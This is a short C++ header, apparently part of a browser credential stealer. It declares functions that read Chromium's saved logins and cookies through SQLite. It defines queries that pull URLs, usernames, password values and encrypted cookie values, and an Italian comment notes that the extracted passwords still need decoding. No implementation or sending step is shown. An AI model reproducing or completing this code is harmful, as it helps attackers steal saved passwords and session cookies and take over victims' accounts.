#pragma once

#include <stdio.h>
#include "../SQLite/SQLite.h"

#define SQLITE_QUERY_COOKIES   "SELECT HOST_KEY, path, encrypted_value FROM cookies"
#define SQLITE_QUERY_CREDENTIALS    "SELECT action_url, username_value, password_value FROM logins"

namespace Chromium {

    /** Per ora le password che tira fuori sono codificate. Sarebbe da de-codificarle. */
    std::stringstream get_credentials(sqlite3 *db);

    std::stringstream get_cookies(sqlite3 *db);

}